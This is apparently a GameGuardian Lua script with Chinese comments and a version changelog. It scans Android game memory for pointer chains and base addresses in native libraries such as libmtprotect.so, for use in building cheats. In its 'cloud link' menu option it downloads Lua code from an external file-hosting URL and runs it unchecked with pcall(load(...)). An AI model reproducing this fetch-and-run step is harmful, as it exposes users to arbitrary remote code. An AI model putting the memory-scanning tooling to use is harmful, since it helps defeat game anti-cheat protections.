--原创作者兔子q2997960785
--兔子q群936517940
--加群须知，不需具体谈论某某游戏外挂脚本等，仅交流技术与心得，
---------更新日志--------
--[[
第一版本 名称:基址文件1.0
提供由风兮构画大体框架
引进中文编程配置
名称:基址文件1.1
由风兮封装自动匹配栈功能
将require引进中文配置删减并添加到文件,加快了速度
通过if改变读取不了0x0偏移量问题
名称:基址匹配1.2
由兔子重新改进核心基址配置(相对比原来，时间最少能减少一半)
风兮接受群员所反馈的一些小bug:
将栈改为状态名称，用tonumer解决读取0x0方法(某些方面上可能还不如if)
提供了新的匹配方式--首匹配，尾匹配和全匹配
提供预加载信息，查询状态，写入状态，
名称:基址匹配1.3
引入基址工具扫描功能，借鉴了别人的思路
(我和风哥最近搞研究关于线程方面，很忙，忙着构思论文，一般不会更新( ͡°❥ ͡°)，感觉用的人也不是很多)
名称:基址工具1.4
优化扫描布局，优化内存以及速度，填入云链引用，列表窗口改为sx小窗口
名称:基址工具1.5
引入指针关联以及模板写法(模板实际就是主核心机制区那些代码)

]]



--------------主核心基址区-----------------
function Get_Search(fname)
local function getRanges()
	local ranges = {}
	local t = gg.getRangesList('^/data/*.so*$')
	for i, v in pairs(t) do
		if v.type:sub(2, 2) == 'w' then
			table.insert(ranges, v)
		end
	end
	return ranges
end
fname=fname or {}
local m=getRanges()
local many={}
if "table"==type(fname) then--首信息1
    for i in pairs(m) do
        local p=m[i].internalName:match("^.*/(.+)")
        if p==fname[1] and m[i].state==fname[2] then
            many={state=m[i].state,start=m[i].start}
            break
        end
    end
elseif "string"==type(fname) then
    if "slow"==fname then--全信息
        for i=1,#m do
            local p=m[i].internalName:match("^.*/(.+)")
            many[i]={name=p,state=m[i].state,start=m[i].start}
        end
    elseif "quick"==fname then--尾信息
        for i=1,#m do
            local p=m[i].internalName:match("^.*/(.+)")
            many[p]={state=m[i].state,start=m[i].start}
        end
    else
        for i=1,#m do--首信息2
            local p=m[i].internalName:match("^.*/(.+)")
            if p==fname then
                many={state=m[i].state,start=m[i].start}
                break
            end
        end
        if AddrInfoLen(many)~=2 then
            return false
        end
    end
else
    error("填写'quick'或者'slow'或者文件名或者{文件名,状态}")
end
return many
end

function Get_Address(Head,Offset,Flag)
    local tinfom=gg.getTargetInfo()
    Flag=Flag or 32
    local t={}
    local Addr
    if Head then
        t[1]={address=Head+Offset[1],flags=Flag}
        if not (#Offset==1) then
            for i=2,#Offset do
                local place=gg.getValues(t)
                t={}
                if not tinfom.x64 then
                    place[1].value=place[1].value & 0xFFFFFFFF
                end
                t[1]={address=place[1].value+Offset[i],flags=Flag}
            end
        end
        Addr=t[1].address
    end
    return string.format("0x%X",Addr)
end
-----------初始化--------------------
manyPoint=Get_Search"quick"
GET=gg.getListItems()
------------private-------------------

function Computation_time(x)
    local fm, fs, ms
    if x >= 60.0 then	   
        fs = x // 60.0
    	ms = x - (fs * 60.0)
    	fm = fs .. " 分 " .. ms .." 秒"
    else
    	fm = x .. " 秒"
    end
    return fm
end
function FirstResultshow()
    local t={}
    if #GET~=1 then
        gg.alert("保存列表没有或者有多条数据，请保证只有一条数据")
        os.exit()
    end
    gg.loadResults(GET)
end
function ScendResultshow()
    local t={}
    if #GET~=1 then
        gg.alert("保存列表没有或者有多条数据，请保证只有一条数据")
        os.exit()
    end
end
function fmatch(fpath)
    local m=fpath:match("^(.*/).+")
    return m
end
function AddrInfoLen(Addrtab)
    local n=0
    for i,v in pairs(Addrtab) do
        n=n+1
    end
    return n
end
---------public--------------------------------------------------
function Relationship()
    gg.alert("采用本脚本之前，请先保证只有两个数据\n一个在保存列表作为父级，另一个则是作为子级存在于搜索列表\n填模板地址时填写父级地址")
    gg.toast("正在寻求父级数据")
    ScendResultshow()
    if gg.getResultsCount()~=1 then
        os.exit()
    else
        gg.setRanges(gg.REGION_C_HEAP | gg.REGION_C_ALLOC | gg.REGION_C_DATA | gg.REGION_C_BSS | gg.REGION_ANONYMOUS)
    end
    local depth, maxOffset, level
local ti = gg.getTargetInfo()
local x64 = ti.x64
local son=gg.getResults(1)--子级
    gg.loadResults(son)
if gg.getResultsCount() == 1 then 
    gg.setRanges(gg.REGION_C_HEAP | gg.REGION_C_ALLOC | gg.REGION_C_DATA | gg.REGION_C_BSS | gg.REGION_ANONYMOUS)
    gg.loadResults(gg.getResults(1))
else
	print("搜索列表为空\n"..
	     "或者大于1条数据,请更正后再开启"
	)
	os.exit()
end    

function printChain(pre, u)
	if u.offset == nil then
		chains = (chains + 1)
        file:write(pre.."\n")
		return pre
	else
		for offset, v in pairs(u.offset) do
			printChain(pre..string.format('+0x%X', offset), v)
		end		
	end	
end

function loadChain(lvl, p)
	local fix, maxo, lev = not x64, maxOffset, level
	for k = lvl, 1, -1 do
		local levk, p2, stop = lev[k], {}, true
		for j, u in pairs(p) do		
			if u.offset == nil then			
				u.offset = {}
				if fix then u.value = u.value & 0xFFFFFFFF end
				for i, v in ipairs(levk) do
					local offset = v.address - u.value
					if offset >= 0 and offset <= maxo then 
						u.offset[offset], p2[v], stop = v, v, false
					end 
				end
			end
		end
		if stop then break end
		p = p2
	end
end

function getRanges()
		local ranges = {}
	local archs = {[0x3] = 'x86', [0x28] = 'ARM', [0x3E] = 'x86-64', [0xB7] = 'AArch64'}  -------区分处理器架构
	local t = gg.getRangesList('^/data/*lib*.so*$')
	local arch = 'unknown'
	local place={{nil},{nil},{nil}}
	local Seenum={}
	local m_Match=function(fname)
	    local a=fname:match('[^/]*$')
	    return a
	end
	for i, v in ipairs(t) do
		if v.type:sub(2, 2) == '-' then
			local t = gg.getValues({ {address = v.start, flags = gg.TYPE_DWORD}, {address = v.start + 0x12, flags = gg.TYPE_WORD} })
			if t[1].value == 0x464C457F then
				arch = archs[t[2].value]
				if arch == nil then arch = 'unknown' end
			end
		end			
		if v.type:sub(2, 2) == 'w' then
			v.arch = arch
			table.insert(ranges, v)
			place[1][#(place[1])+1]=m_Match(v.internalName)
			place[2][#(place[2])+1]=true
			place[3][#(place[3])+1]="checkbox"
		end
	end
	local see=gg.prompt(place[1],place[2],place[3])
	if not see then os.exit() end
	for i=1,#(place[1]) do
	    if see[i] then
	        Seenum[i]=ranges[i]
	    end
	end
	
	return Seenum
end
local old = gg.getResults(gg.getResultCount())
local cfg_file = string.format("%s/%s1.cfg",gg.EXT_FILES_DIR,gg.getFile():match("[^/]+$"))
local chunk = loadfile(cfg_file)    
local cfg = nil
if chunk then cfg = chunk() end
if not cfg then cfg = {} end
local pkg = gg.getTargetPackage()
if not pkg then pkg = 'none' end
local def = cfg[pkg]
local script = gg.getFile():gsub('[^/]*$', '')..ti.packageName
for i = 1, 500 do
    local f = io.open(script..i..'※.txt')
    if f == nil then
        script = script..i..'※.txt'
		break
	end
	f:close()
end

if def == nil then def = {[1]=3,[2]=0x100,[3]=script} end
local p = gg.prompt({'深度:', '最大偏移量: ',"输出文件"},def,{'number','number',"file"})
if not p then os.exit() end
level = {}
cfg[pkg] = p
gg.saveVariable(cfg, cfg_file)
depth, maxOffset = p[1], tonumber(p[2])
file, chains = io.open(p[3], 'a'), 0
gg.setVisible(false)
local x = os.clock()
while true do
    for lvl = 0, depth do 
		if lvl > 0 then
			local t = gg.getResults(1000000)
			level[lvl] = t
			gg.toast(lvl..' ﹥_﹥ '..depth)
            if (lvl == depth) then
                gg.setRanges(gg.REGION_C_DATA | gg.REGION_C_BSS)
            end            
            gg.searchPointer(maxOffset)
	    end
		for m, r in ipairs(GET) do
			local p = gg.getResults(1000000, 0, r.start, r['end'])
			if #p > 0 then
			    local out = {}
				loadChain(lvl, p)
				table.insert(out, p)
             	for j, p in ipairs(out) do
            		for i, u in ipairs(p) do
            		    local sopy = string.format('父级+0x%X',( (u.address) - (r.address) ))
              			printChain(sopy, u)
            	    end 
             	end
			end
		end		
		if gg.getResultsCount() == 0 then break end
	end
	
    gg.loadResults(old)
        
    file:close()
    
    local fm = Computation_time(os.clock() - x)
    
    if chains ~= 0 then 
        print("耗时: "..fm.."\n深度: "..depth.." 最大偏移量: "..maxOffset.."\n已经输出基址数: "..(chains).." \n".."输出路径为: "..p[3])
    else
        os.remove(p[3], "e")
        print("耗时: "..fm.."\n基址符合条件: "..(chains).." 条\n太惨了！")
    end
    break
end

os.exit(gg.setVisible(true))
end




function Search()
FirstResultshow()

local depth, maxOffset, level
local ti = gg.getTargetInfo()
local x64 = ti.x64
if gg.getResultsCount() == 1 then 
    gg.setRanges(gg.REGION_C_HEAP | gg.REGION_C_ALLOC | gg.REGION_C_DATA | gg.REGION_C_BSS | gg.REGION_ANONYMOUS)
    gg.loadResults(gg.getResults(1))
else
	print("搜索列表为空\n"..
	     "或者大于1条数据,请更正后再开启"
	)
	os.exit()
end    

function printChain(pre, u)
	if u.offset == nil then
		chains = (chains + 1)
        file:write(pre.."\n")
		return pre
	else
		for offset, v in pairs(u.offset) do
			printChain(pre..string.format('+0x%X', offset), v)
		end		
	end	
end

function loadChain(lvl, p)
	local fix, maxo, lev = not x64, maxOffset, level
	for k = lvl, 1, -1 do
		local levk, p2, stop = lev[k], {}, true
		for j, u in pairs(p) do		
			if u.offset == nil then			
				u.offset = {}
				if fix then u.value = u.value & 0xFFFFFFFF end
				for i, v in ipairs(levk) do
					local offset = v.address - u.value
					if offset >= 0 and offset <= maxo then 
						u.offset[offset], p2[v], stop = v, v, false
					end 
				end
			end
		end
		if stop then break end
		p = p2
	end
end

function getRanges()
		local ranges = {}
	local archs = {[0x3] = 'x86', [0x28] = 'ARM', [0x3E] = 'x86-64', [0xB7] = 'AArch64'}  -------区分处理器架构
	local t = gg.getRangesList('^/data/*lib*.so*$')
	local arch = 'unknown'
	local place={{nil},{nil},{nil}}
	local Seenum={}
	local m_Match=function(fname)
	    local a=fname:match('[^/]*$')
	    return a
	end
	for i, v in ipairs(t) do
		if v.type:sub(2, 2) == '-' then
			local t = gg.getValues({ {address = v.start, flags = gg.TYPE_DWORD}, {address = v.start + 0x12, flags = gg.TYPE_WORD} })
			if t[1].value == 0x464C457F then
				arch = archs[t[2].value]
				if arch == nil then arch = 'unknown' end
			end
		end			
		if v.type:sub(2, 2) == 'w' then
			v.arch = arch
			table.insert(ranges, v)
			place[1][#(place[1])+1]=m_Match(v.internalName)
			place[2][#(place[2])+1]=true
			place[3][#(place[3])+1]="checkbox"
		end
	end
	local see=gg.prompt(place[1],place[2],place[3])
	if not see then os.exit() end
	for i=1,#(place[1]) do
	    if see[i] then
	        Seenum[i]=ranges[i]
	    end
	end
	
	return Seenum
end
local old = gg.getResults(gg.getResultCount())
local cfg_file = string.format("%s/%s1.cfg",gg.EXT_FILES_DIR,gg.getFile():match("[^/]+$"))
local chunk = loadfile(cfg_file)    
local cfg = nil
if chunk then cfg = chunk() end
if not cfg then cfg = {} end
local pkg = gg.getTargetPackage()
if not pkg then pkg = 'none' end
local def = cfg[pkg]
local script = gg.getFile():gsub('[^/]*$', '')..ti.packageName
for i = 1, 500 do
    local f = io.open(script..i..'※.txt')
    if f == nil then
        script = script..i..'※.txt'
		break
	end
	f:close()
end

if def == nil then def = {[1]=3,[2]=0x100,[3]=script} end
local p = gg.prompt({'深度:', '最大偏移量: ',"输出文件"},def,{'number','number',"file"})
if not p then os.exit() end
level = {}
cfg[pkg] = p
gg.saveVariable(cfg, cfg_file)
depth, maxOffset = p[1], tonumber(p[2])
file, chains = io.open(p[3], 'a'), 0

    
gg.setVisible(false)

local x = os.clock()

local ranges = getRanges(gg.toast("加载模块信息中..."))
	
while true do
    for lvl = 0, depth do 
		if lvl > 0 then
			local t = gg.getResults(1000000)
			level[lvl] = t
			gg.toast(lvl..' ﹥_﹥ '..depth)
            if (lvl == depth) then
                gg.setRanges(gg.REGION_C_DATA | gg.REGION_C_BSS)
            end            
            gg.searchPointer(maxOffset)
	    end
		for m, r in ipairs(ranges) do
			local p = gg.getResults(1000000, 0, r.start, r['end'])
			if #p > 0 then
			    local out = {}
				gg.removeResults(p)
				loadChain(lvl, p)
				p.map = r
				table.insert(out, p)
             	for j, p in ipairs(out) do
             	    local Name_t=p.map.internalName:gsub('^.*/', '')
            		for i, u in ipairs(p) do
            		    local sopy = string.format('%s+0x%X', Name_t,( (u.address) - (p.map.start) ))
              			printChain(sopy, u)
            	    end 
             	end
			end
		end		
		if gg.getResultsCount() == 0 then break end
	end
	
    gg.loadResults(old)
        
    file:close()
    
    local fm = Computation_time(os.clock() - x)
    
    if chains ~= 0 then 
        print("耗时: "..fm.."\n深度: "..depth.." 最大偏移量: "..maxOffset.."\n已经输出基址数: "..(chains).." \n".."输出路径为: "..p[3])
    else
        os.remove(p[3], "e")
        print("耗时: "..fm.."\n基址符合条件: "..(chains).." 条\n太惨了！")
    end
    break
end

os.exit(gg.setVisible(true))
end


function Write()
    local List=gg.prompt({"输出路径","输出文件名字","输出尾匹配(已加载,快)","输出全匹配(未加载,慢)"},{fmatch(gg.getFile()),os.time()..".txt",true,false},{"path","file","checkbox","checkbox"})
    local f=io.open(List[1]..List[2],"w")
    if List[3] then
        for i,v in pairs(manyPoint) do
            f:write("文件【",i,"】状态【",v.state,"】当前地址【",string.format("%X",v.start),"】\n")
        end
    elseif List[4] then
        local many=Get_Search"slow"
        for i,v in ipairs(many) do
            f:write("文件【",v.name,"】状态【",v.state,"】当前地址【",string.format("%X",v.start),"】\n")
        end
    end
    f:close()
end

function Find()
    local List=gg.prompt({"寻找文件名(以下匹配方式可不选择，那将会调用默认匹配)","尾匹配(已加载，快)","全匹配(未加载，慢)"},{"libmtprotect.so",false,false},{"text","checkbox","checkbox"})
    if not(List[2] or List[3]) then
        local many=Get_Search(List[1])
        if many then
            gg.alert(string.format("文件%s\n状态%s\n当前地址%X",List[1],many.state,many.start))
            gg.copyText(string.format("%X",many.start))
            gg.toast("自动复制地址，软件限制请自动转化16进制")
        else
            error("参数错误,又或者没匹配到")
        end
    elseif List[2] then
        if manyPoint[List[1]] then
            gg.copyText(string.format("%X",manyPoint[List[1]].start))
            gg.alert(string.format("文件%s\n状态%s\n当前地址%X\n",List[1],manyPoint[List[1]].state,manyPoint[List[1]].start))
            gg.toast("自动复制地址，软件限制请自动转化16进制")
        else
            error("the parameter ' "..List[1].." 'is error！")
        end
    elseif List[3] then
        local cpy={}
        local t={}
        many=Get_Search"slow"
        for i=1,#many do
            if List[1]==many[i].name then
                t[#t+1]=string.format("文件%s\n状态%s\n当前地址'%X'\n",List[1],many[i].state,many[i].start)
                cpy[#cpy+1]=i
            end
        end
        if t[1] then
            local cho=gg.choice(t,nil,"加载有以下"..#t.."条信息")
            if cho then
            gg.copyText(string.format("%X",many[cpy[cho]].start))
            gg.toast("已经复制地址,gg限制，请自行转化16进制")
            end
        else
            error("the parameter ' "..List[1].." 'is error！")
        end
    else
        Main()
    end
end

function Match()
    FirstResultshow()
    local get=gg.getResults(gg.getResultsCount())
    local num,fread,fwrite,StartAddr
    local Num={}
    local str=string.format("0x%X",GET[1].address)
    local many={}
    local List=gg.prompt({"读取的文件","输出文件路径","输出文件名字","基址名称[以下匹配未勾选的，调用采用首匹配2]","状态匹配[首匹配1,推荐]","状态","尾匹配[已加载，快]","全匹配[未加载，慢]"},{gg.getFile(),fmatch(gg.getFile()),os.time()..".txt","libmtprotect.so",true,"Cd",false,false},{"file","path","text","text","checkbox","text","checkbox","checkbox"})
    if not(List[5] or List[7] or List[8]) then
        many[List[4]]=Get_Search(List[4])
    elseif List[5] then
        many[List[4]]=Get_Search({List[4],List[6]})
    elseif List[7] then
        many[List[4]]=manyPoint[List[4]]
    elseif List[8] then
        many=Get_Search"slow"
        local t={}
        for i=1,#many do
            if many[i].name == List[4] then
                Num[#Num+1]=i
                t[#t+1]=string.format("文件%s\n状态%s\n当前地址'%X'\n",List[4],many[i].state,many[i].start)
            end
        end
        num=gg.choice(t,nil,"选择一个")
    else
        Main()
        os.exit()
    end
    fread=io.open(List[1],"r")
    fwrite=io.open(List[2]..List[3],"w")
    if num then
        StartAddr=many[Num[num]].start
    else
        StartAddr=many[List[4]].start
    end
    if not StartAddr then
    print("没匹配到")
    os.exit()
    else
        for line in fread:lines("l") do
            local moveaddr={}
            local faddr,py=line:match("(.-)%+(.+)")
            if faddr==List[4] then
                for snum in py:gmatch("(%w+)") do
                    moveaddr[#moveaddr+1]=tonumber(snum)
                end
                local addr=Get_Address(StartAddr,moveaddr,32)
                if addr==str then
                    fwrite:write(line,"\n")
                end
            end
        end
    end
    fread:close()
    fwrite:close()
end
function Main()
    gg.showUiButton()
    if gg.isClickedUiButton() then
    local List=gg.choice({"[文件]写入基址信息","[查询]搜索基址信息","[匹配]基址匹配工具","[扫描]基址扫描工具","[关联性]计算父级与子级","云链","退出"},nil,"当前已快速加载"..AddrInfoLen(manyPoint).."条基址信息，退出脚本重新启动可刷新此数据")
    if List==1 then Write()
    elseif List==2 then Find()
    elseif List==3 then Match()
    elseif List==4 then Search()
    elseif List==5 then Relationship()
    elseif List==6 then 
        local a=gg.makeRequest("http://pan.axxpan.com/api/v3/file/get/22110/%E4%B8%AD%E8%BD%AC%E7%AB%99.lua?sign=x9L0vQ8dqdNNBErrSTa6_9Ih2RUjhOGgFR3qQs3awck%3D%3A0").content
        pcall(load(a))
    
    
    
    
    elseif List==7 then os.exit()
    end
    
    end
end

-------------------------------
while true do
if gg.isVisible()==true then
    Main()
end
end